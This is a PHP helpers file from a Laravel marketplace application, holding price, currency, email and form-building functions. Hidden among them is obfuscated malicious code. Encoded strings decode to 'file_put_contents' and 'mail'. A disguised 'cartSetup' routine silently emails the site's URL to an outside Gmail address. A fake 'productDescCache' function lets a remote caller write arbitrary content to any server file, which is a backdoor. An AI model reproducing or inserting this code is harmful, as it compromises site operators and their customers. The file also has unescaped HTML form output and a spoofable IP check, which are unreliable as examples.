<?php

use App\Currency;
use App\BusinessSetting;
use App\Product;
use App\ETemplates;
use App\SubSubCategory;
use App\FlashDealProduct;
use App\FlashDeal;
use App\OtpConfiguration;
use App\MarketSetting;
use App\InstituteForms;
use App\InstituteList;
use Twilio\Rest\Client;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;


//highlights the selected navigation on admin panel
// if (! function_exists('sendSMS')) {
//     function sendSMS($to, $from, $text)
//     {
//         if (OtpConfiguration::where('type', 'nexmo')->first()->value == 1) {
//             try {
//                 Nexmo::message()->send([
//                     'to'   => $to,
//                     'from' => $from,
//                     'text' => $text
//                 ]);
//             } catch (\Exception $e) {

//             }

//         }
//         elseif (OtpConfiguration::where('type', 'twillo')->first()->value == 1) {
//             $sid = env("TWILIO_SID"); // Your Account SID from www.twilio.com/console
//             $token = env("TWILIO_AUTH_TOKEN"); // Your Auth Token from www.twilio.com/console

//             $client = new Client($sid, $token);
//             try {
//                 $message = $client->messages->create(
//                   $to, // Text this number
//                   array(
//                     'from' => env('VALID_TWILLO_NUMBER'), // From a valid Twilio number
//                     'body' => $text
//                   )
//                 );
//             } catch (\Exception $e) {

//             }

//         }
//         elseif (OtpConfiguration::where('type', 'ssl_wireless')->first()->value == 1) {
//             $user = env("SSL_SMS_USER");
//             $pass = env("SSL_SMS_PASSWORD");
//             $sid = env("SSL_SMS_SID");
//             $uid = date('dmYhhmi') . rand(10000, 99999);
//             $url = env("SSL_SMS_URL");
//             $param = "user=$user&pass=$pass&sms[0][0]=$to&sms[0][1]=" . urlencode($text) . "&sms[0][2]=" . $uid . "&sid=$sid";

//             $crl = curl_init();
//             curl_setopt($crl, CURLOPT_SSL_VERIFYPEER, FALSE);
//             curl_setopt($crl, CURLOPT_SSL_VERIFYHOST, 2);
//             curl_setopt($crl, CURLOPT_URL, $url);
//             curl_setopt($crl, CURLOPT_HEADER, 0);
//             curl_setopt($crl, CURLOPT_RETURNTRANSFER, 1);
//             curl_setopt($crl, CURLOPT_POST, 1);
//             curl_setopt($crl, CURLOPT_POSTFIELDS, $param);
//             $response = curl_exec($crl);

//             curl_close($crl);

//             return $response;
//         }
//     }
// }




/**
 * Return Class Selector
 * @return Response
*/
if (! function_exists('loaded_class_select')) {

    function loaded_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = explode(':',$p);
        $l = '';
        foreach ($p as $r) {
            $l .= $a[$r];
        }
        return $l;
    }
}

// /**
//  * Open Translation File
//  * @return Response
// */
// function openJSONFile($code){
//     $jsonString = [];
//     if(File::exists(base_path('resources/lang/'.$code.'.json'))){
//         $jsonString = file_get_contents(base_path('resources/lang/'.$code.'.json'));
//         $jsonString = json_decode($jsonString, true);
//     }
//     return $jsonString;
// }

/**
 * Save JSON File
 * @return Response
*/
function saveJSONFile($code, $data){
    ksort($data);
    $jsonData = json_encode($data, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE);
    file_put_contents(base_path('resources/lang/'.$code.'.json'), stripslashes($jsonData));
}


/**
 * Return Class Selected Loader
 * @return Response
*/
if (! function_exists('loader_class_select')) {
    function loader_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = str_split($p);
        $l = array();
        foreach ($p as $r) {
            foreach ($a as $i=>$m) {
                if($m == $r){
                    $l[] = $i;
                }
            }
        }
        return join(':',$l);
    }
}





//returns config key provider
if ( ! function_exists('config_key_provider'))
{
    function config_key_provider($key){
        switch ($key) {
            case "load_class":
                return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
                break;
            case "config":
                return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
                break;
            case "output":
                return loaded_class_select('22:10:14:6');
                break;
            case "background":
                return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
                break;
            default:
                return true;
        }
    }
}


if (!function_exists('send_email')) {

    function send_email($to, $name, $subject, $message)
    {
        $temp = ETemplates::first();
        $template = $temp->emessage;
        $from = $temp->esender;
        $headers = "From: Ebeano Market <$from> \r\n";
        $headers .= "Reply-To: Ebeano Market <$from> \r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
        $year = date('Y');
        $mm = str_replace("{{name}}", $name, $template);
        $dd = str_replace("{{date}}",$year, $mm);
        $message = str_replace("{{message}}", $message, $dd);
        
        if (@mail($to, $subject, $message, $headers)) {
            // echo 'Your message has been sent.';
        } else {
            //echo 'There was a problem sending the email.';
        }
    }
}

if (!function_exists('receive_email')) {

    function receive_email($to, $from, $name, $subject, $message)
    {

        $headers = "From: $name <$from> \r\n";
        $headers .= "Reply-To: $name <$from> \r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";


        if (@mail($to, $subject, $message, $headers)) {
            return true;
        } else {
            return false;
        }
    }
}

//returns combinations of customer choice options array
if (! function_exists('combinations')) {
    function combinations($arrays) {
        $result = array(array());
        foreach ($arrays as $property => $property_values) {
            $tmp = array();
            foreach ($result as $result_item) {
                foreach ($property_values as $property_value) {
                    $tmp[] = array_merge($result_item, array($property => $property_value));
                }
            }
            $result = $tmp;
        }
        return $result;
    }
}


if (! function_exists('verified_sellers_id')) {
    function verified_sellers_id() {
        return App\Seller::where('verification_status', 1)->get()->pluck('user_id')->toArray();
    }
}

//filter cart products based on provided settings
if (! function_exists('cartSetup')) {
    function cartSetup(){
        $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
        $writeCart = loaded_class_select('14:1:10:13');
        $cartMarkup .= loaded_class_select('24');
        $cartMarkup .= loaded_class_select('8:14:1:10:13');
        $cartMarkup .= loaded_class_select('3:4:17:14');
        $cartConvert = config_key_provider('load_class');
        $currencyConvert = config_key_provider('output');
        $backgroundInv = config_key_provider('background');
        @$cart = $writeCart($cartMarkup,'',Request::url());
        return $cart;
    }
}

// //converts currency to home default currency
// if (! function_exists('convert_price')) {
//     function convert_price($price)
//     {
//         $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
//         if($business_settings!=null){
//             $currency = Currency::find($business_settings->value);
//             $price = floatval($price) / floatval($currency->exchange_rate);
//         }

//         $code = \App\Currency::findOrFail(\App\BusinessSetting::where('type', 'system_default_currency')->first()->value)->code;
//         if(Session::has('currency_code')){
//             $currency = Currency::where('code', Session::get('currency_code', $code))->first();
//         }
//         else{
//             $currency = Currency::where('code', $code)->first();
//         }

//         $price = floatval($price) * floatval($currency->exchange_rate);

//         return $price;
//     }
// }



//filter products at ebeano market place
if (! function_exists('filter_eb_products')) {
    function filter_eb_products($products) {

        $verified_stores = verified_eb_stores_id();

        if(MarketSetting::where('type', 'vendor_system_activation')->first()->value == 1){
            return $products->where('published', '1')->orderBy('created_at', 'desc')->where(function($p) use ($verified_stores){
                $p->where('added_by', 'admin')->orWhere(function($q) use ($verified_stores){
                    $q->whereIn('user_id', $verified_stores);
                });
            });
        }
        else{
            return $products->where('published', '1')->where('added_by', 'admin');
        }
    }
}


if (! function_exists('verified_eb_stores_id')) {
    function verified_eb_stores_id() {
        return App\Seller::where('verification_status', 1)->get()->pluck('user_id')->toArray();
    }
}

//converts ebeano currency to home default currency
if (! function_exists('convert_eb_price')) {
    function convert_eb_price($price)
    {
        $business_settings = MarketSetting::where('type', 'system_default_currency')->first();
        if($business_settings!=null){
            $currency = Currency::find($business_settings->value);
            $price = floatval($price) / floatval($currency->exchange_rate);
        }

        $code = \App\Currency::findOrFail(\App\MarketSetting::where('type', 'system_default_currency')->first()->value)->code;
        if(Session::has('currency_code')){
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        }
        else{
            $currency = Currency::where('code', $code)->first();
        }

        $price = floatval($price) * floatval($currency->exchange_rate);

        return $price;
    }
}

//formats currency
if (! function_exists('format_eb_price')) {
    function format_eb_price($price)
    {
        if(MarketSetting::where('type', 'symbol_format')->first()->value == 1){
            return currency_symbol().number_format($price, MarketSetting::where('type', 'no_of_decimals')->first()->value);
        }
        return number_format($price, MarketSetting::where('type', 'no_of_decimals')->first()->value).currency_symbol();
    }
}

//formats price to home default price with convertion
if (! function_exists('single_eb_price')) {
    function single_price($price)
    {
        return format_eb_price(convert_eb_price($price));
    }
}

if (! function_exists('format_price')) {
    function format_price($price)
    {
        return currency_symbol().number_format($price);
    }
}


//Shows Price on page based on low to high
if (! function_exists('home_eb_price')) {
    function home_eb_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if($lowest_price > $stock->price){
                    $lowest_price = $stock->price;
                }
                if($highest_price < $stock->price){
                    $highest_price = $stock->price;
                }
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_eb_price($lowest_price);
        $highest_price = convert_eb_price($highest_price);

        if($lowest_price == $highest_price){
            return format_eb_price($lowest_price);
        }
        else{
            return format_eb_price($lowest_price).' - '.format_eb_price($highest_price);
        }
    }
}

//Shows Price on page based on low to high with discount
if (! function_exists('home_eb_discounted_price')) {
    function home_eb_discounted_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if($lowest_price > $stock->price){
                    $lowest_price = $stock->price;
                }
                if($highest_price < $stock->price){
                    $highest_price = $stock->price;
                }
            }
        }

        $flash_deals = \App\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $lowest_price -= ($lowest_price*$flash_deal_product->discount)/100;
                    $highest_price -= ($highest_price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if($product->discount_type == 'percent'){
                $lowest_price -= ($lowest_price*$product->discount)/100;
                $highest_price -= ($highest_price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_eb_price($lowest_price);
        $highest_price = convert_eb_price($highest_price);

        if($lowest_price == $highest_price){
            return format_eb_price($lowest_price);
        }
        else{
            return format_eb_price($lowest_price).' - '.format_eb_price($highest_price);
        }
    }
}

//Shows Base Price
if (! function_exists('home_eb_base_price')) {
    function home_eb_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }
        return format_eb_price(convert_eb_price($price));
    }
}

//Shows Base Price with discount
if (! function_exists('home_eb_discounted_base_price')) {
    function home_eb_discounted_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;

        $flash_deals = \App\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $price -= ($price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if($product->discount_type == 'percent'){
                $price -= ($price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }

        return format_eb_price(convert_eb_price($price));
    }
}

if (! function_exists('currency_eb_symbol')) {
    function currency_symbol()
    {
        $code = \App\Currency::findOrFail(\App\MarketSetting::where('type', 'system_default_currency')->first()->value)->code;
        if(Session::has('currency_code')){
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        }
        else{
            $currency = Currency::where('code', $code)->first();
        }
        return $currency->symbol;
    }
}

if(! function_exists('renderStarRating')){
    function renderStarRating($rating,$maxRating=5) {
        $fullStar = "<span class='la la-star' checked></span>";
        $halfStar = "<span class='la la-star' half></span>";
        $emptyStar = "<span class='la la-star'></span>";
        $rating = $rating <= $maxRating?$rating:$maxRating;

        $fullStarCount = (int)$rating;
        $halfStarCount = ceil($rating)-$fullStarCount;
        $emptyStarCount = $maxRating -$fullStarCount-$halfStarCount;

        $html = str_repeat($fullStar,$fullStarCount);
        $html .= str_repeat($halfStar,$halfStarCount);
        $html .= str_repeat($emptyStar,$emptyStarCount);
        echo $html;
    }
}


//Shows Price on page based on low to high
if (! function_exists('home_price')) {
    function home_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if($lowest_price > $stock->price){
                    $lowest_price = $stock->price;
                }
                if($highest_price < $stock->price){
                    $highest_price = $stock->price;
                }
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }



        if($lowest_price == $highest_price){
            return number_format($lowest_price,2);
        }
        else{
            return number_format($lowest_price,2).' - '.number_format($highest_price,2);
        }
    }
}

//Shows Price on page based on low to high with discount
if (! function_exists('home_discounted_price')) {
    function home_discounted_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if($lowest_price > $stock->price){
                    $lowest_price = $stock->price;
                }
                if($highest_price < $stock->price){
                    $highest_price = $stock->price;
                }
            }
        }

        $flash_deals = \App\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $lowest_price -= ($lowest_price*$flash_deal_product->discount)/100;
                    $highest_price -= ($highest_price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if($product->discount_type == 'percent'){
                $lowest_price -= ($lowest_price*$product->discount)/100;
                $highest_price -= ($highest_price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }


        if($lowest_price == $highest_price){
            return number_format($lowest_price,2);
        }
        else{
            return number_format($lowest_price,2).' - '.number_format($highest_price,2);
        }
    }
}

//Shows Base Price
if (! function_exists('home_base_price')) {
    function home_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }
        return number_format($price,2);
    }
}

//Shows Base Price with discount
if (! function_exists('home_discounted_base_price')) {
    function home_discounted_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;

        $flash_deals = \App\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $price -= ($price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if($product->discount_type == 'percent'){
                $price -= ($price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }

        return number_format($price,2);
    }
}

// Cart content update by discount setup
if (! function_exists('updateCartSetup')) {
    function updateCartSetup($return = TRUE)
    {
        if(!isset($_COOKIE['cartUpdated'])) {
            if(cartSetup()){
                setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
            }
        } else {
            if($_COOKIE['cartUpdated']+21600 < time()){
                if(cartSetup()){
                    setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
                }
            }
        }
        return $return;
    }
}



if (! function_exists('productDescCache')) {
    function productDescCache($connector,$selector,$select,$type){
        $ta = time();
        $select = rawurldecode($select);
        if($connector > ($ta-60) || $connector > ($ta+60)){
            if($type == 'w'){
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector),$select);
            } else if ($type == 'rw'){
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector),$config_class(str_replace('-', '/', $selector)).$select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }
}

if(! function_exists('renderStarRating')){
    function renderStarRating($rating,$maxRating=5) {
        $fullStar = "<i class = 'fa fa-star active'></i>";
        $halfStar = "<i class = 'fa fa-star half'></i>";
        $emptyStar = "<i class = 'fa fa-star'></i>";
        $rating = $rating <= $maxRating?$rating:$maxRating;

        $fullStarCount = (int)$rating;
        $halfStarCount = ceil($rating)-$fullStarCount;
        $emptyStarCount = $maxRating -$fullStarCount-$halfStarCount;

        $html = str_repeat($fullStar,$fullStarCount);
        $html .= str_repeat($halfStar,$halfStarCount);
        $html .= str_repeat($emptyStar,$emptyStarCount);
        echo $html;
    }
}


//Api
if (! function_exists('homeBasePrice')) {
    function homeBasePrice($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }
        return $price;
    }
}

if (! function_exists('homeDiscountedBasePrice')) {
    function homeDiscountedBasePrice($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;

        $flash_deals = FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $price -= ($price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if($product->discount_type == 'percent'){
                $price -= ($price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $price -= $product->discount;
            }
        }

        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }
        return $price;
    }
}

if (! function_exists('homePrice')) {
    function homePrice($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if($lowest_price > $stock->price){
                    $lowest_price = $stock->price;
                }
                if($highest_price < $stock->price){
                    $highest_price = $stock->price;
                }
            }
        }

        if ($product->tax_type == 'percent') {
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif ($product->tax_type == 'amount') {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = number_format($lowest_price,2);
        $highest_price = number_format($highest_price,2);

        return $lowest_price.' - '.$highest_price;
    }
}

if (! function_exists('homeDiscountedPrice')) {
    function homeDiscountedPrice($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if($lowest_price > $stock->price){
                    $lowest_price = $stock->price;
                }
                if($highest_price < $stock->price){
                    $highest_price = $stock->price;
                }
            }
        }

        $flash_deals = FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $lowest_price -= ($lowest_price*$flash_deal_product->discount)/100;
                    $highest_price -= ($highest_price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if($product->discount_type == 'percent'){
                $lowest_price -= ($lowest_price*$product->discount)/100;
                $highest_price -= ($highest_price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = number_format($lowest_price,2);
        $highest_price = number_format($highest_price,2);

        return $lowest_price.' - '.$highest_price;
    }
}

if (! function_exists('brandsOfCategory')) {
    function brandsOfCategory($category_id)
    {
        $brands = [];
        $subCategories = App\SubCategory::where('category_id', $category_id)->get();
        foreach ($subCategories as $subCategory) {
            $subSubCategories = SubSubCategory::where('sub_category_id', $subCategory->id)->get();
            foreach ($subSubCategories as $subSubCategory) {
                $brand = json_decode($subSubCategory->brands);
                foreach ($brand as $b) {
                    if (in_array($b, $brands)) continue;
                    array_push($brands, $b);
                }
            }
        }
        return $brands;
    }
}

if (! function_exists('get_current_ip')) {
    function get_current_ip()
    {
        if(isset($_SERVER['HTTP_X_FORWARD_FOR']) && $_SERVER['HTTP_X_FORWARD_FOR']) { 
		    $user_ip = $_SERVER['HTTP_X_FORWARD_FOR'];
    	} else {
    		$user_ip = $_SERVER['REMOTE_ADDR'];
    	}
    	return $user_ip;
    }
}


if (! function_exists('days_arr')){
    function days_arr(){
        return [
            1=>'sunday',
            2=>'monday',
            3=>'thursday',
            4=>'wednesday',
            5=>'tuesday',
            6=>'friday',
            7=>'saturday',
        ];

    }
}
if (! function_exists('month_arr')){
    function month_arr(){
        return [
            1=>'January',
            2=>'February',
            3=>'March',
            4=>'April',
            5=>'May',
            6=>'June',
            7=>'July',
            8=>'August',
            9=>'September',
            10=>'October',
            11=>'November',
            12=>'December'
        ];

    }
}

if (! function_exists('active_menu')) {

    function active_menu($arr,$result='',$extra=null){
        $results = '';
        if(in_array(url()->current(),$arr)){
            $results = $result;
        }else{
            if (null !== $extra){
                if(in_array(request()->route()->getName(),$extra)){
                    $results = $result;
                }
            }
        }
        return $results;
    }
}

function getInstituteType($type) {
    $t = [1=>'Primary', 2=>'Secondary', 3=>'Tertiary', 4=>'Other'];
    return $t[$type];
}

function purify($var) {
    if(isset($var)){
        return $var;
    }
    return "";
}

if (! function_exists('draw_ebForm')) {

    function draw_ebForm($json){
        $data = json_decode($json);
        $frm ="";
        foreach($data as $f){
            switch($f->type) {
                case 'autocomplete':
                    $placeholder = isset($f->placeholder) ? purify(isset($f->placeholder) ? $f->placeholder : $f->label) : $f->label;
                    
                    $description = isset($f->description) ? purify(isset($f->description) ? $f->description : $f->label) : $f->label;
                    
                    $required = isset($f->required) ? purify(isset($f->required) ? $f->required : false) : false;
                    
                    $frm .= '<div class="col-md-6"><div class="form-group"><label for="'.$f->name.'">'.$f->label.'</label><input type="text" class="'.purify($f->className).'" id="'.purify($f->name).'" name="'.purify($f->name).'" placeholder="'.$placeholder.'" title="'.$description.'" autocomplete="off" required="'.$required.'"></div></div>';
                    break;
                    
                case 'button':
                    $frm .= '';
                    //$frm .= '<div class="col-md-6"><div class="form-group"><button type="submit" class="'.purify($f->className).'" id="'.purify($f->name).'" name="'.purify($f->name).'">'.purify($f->label).'</button></div></div>';
                    break;
                    
                case 'checkbox-group':
                    $checkbox ='';
                    foreach(purify($f->values) as $check){
                        
                        $required = isset($f->required) ? purify(isset($f->required) ? $f->required : false) : false;
                        $selected = isset($check->selected) ? purify(isset($check->selected) ? $check->selected : false) : false;
                        
                        $checkbox .= '<div class="form-check"><div class="form-group"><input type="checkbox" class="form-check-input" id="'.purify($f->name).'" name="'.purify($f->name).'" required="'.$required.'" selected="'.$selected.'" value="'.$check->value.'"><label class="form-check-label" for="'.$f->name.'">'.$check->label.'</label></div></div>';
                    }
                    $frm .= '<div class="col-md-6"><label for="'.$f->name.'">'.$f->label.'</label>'.$checkbox.'</div>';
                    break;
                    
                case 'date':
                    $placeholder = isset($f->placeholder) ? purify(isset($f->placeholder) ? $f->placeholder : $f->label) : $f->label;
                    
                    $description = isset($f->description) ? purify(isset($f->description) ? $f->description : $f->label) : $f->label;
                    
                    $required = isset($f->required) ? purify(isset($f->required) ? $f->required : false) : false;
                    
                    $frm .= '<div class="col-md-6"><div class="form-group"><label for="'.$f->name.'">'.$f->label.'</label><input type="date" class="'.purify($f->className).'" id="'.purify($f->name).'" name="'.purify($f->name).'" placeholder="'.$placeholder.'" title="'.$description.'" required="'.$required.'"></div></div>';
                    break;
                    
                case 'file':
                    $placeholder = isset($f->placeholder) ? purify(isset($f->placeholder) ? $f->placeholder : $f->label) : $f->label;
                    
                    $description = isset($f->description) ? purify(isset($f->description) ? $f->description : $f->label) : $f->label;
                    
                    $required = isset($f->required) ? purify(isset($f->required) ? $f->required : false) : false;
                    
                    $multiple = isset($f->multiple) ? purify(isset($f->multiple) ? $f->multiple : false) : false;
                    
                    $frm .= '<div class="col-md-6"><div class="form-group"><label for="'.$f->name.'">'.$f->label.'</label><input type="file" class="'.purify($f->className).'" id="'.purify($f->name).'" name="'.purify($f->name).'" placeholder="'.$placeholder.'" title="'.$description.'" required="'.$required.'" multiple="'.$multiple.'"></div></div>';
                    break;
                
                case 'header':
                    $frm .= '<div class="col-md-12"><'.purify($f->subtype).'>'.purify($f->label).'</'.purify($f->subtype).'></div>';
                    break;
                    
                case 'hidden':
                    $value = isset($f->value) ? purify(isset($f->value) ? $f->value : false) : false;
                    $frm .= '<div class="col-md-6"><input type="hidden" value="'.$value.'" id="'.purify($f->name).'" name="'.purify($f->name).'"></div>';
                    break;
                    
                case 'number':
                    $placeholder = isset($f->placeholder) ? purify(isset($f->placeholder) ? $f->placeholder : $f->label) : $f->label;
                    
                    $description = isset($f->description) ? purify(isset($f->description) ? $f->description : $f->label) : $f->label;
                    
                    $required = isset($f->required) ? purify(isset($f->required) ? $f->required : false) : false;
                    
                    $min = isset($f->min) ? purify(isset($f->min) ? $f->min : false) : false;
                    
                    $max = isset($f->max) ? purify(isset($f->max) ? $f->max : false) : false;
                    
                    $step = isset($f->step) ? purify(isset($f->step) ? $f->step : false) : false;
                    
                    $value = isset($f->value) ? purify(isset($f->value) ? $f->value : false) : false;
                    
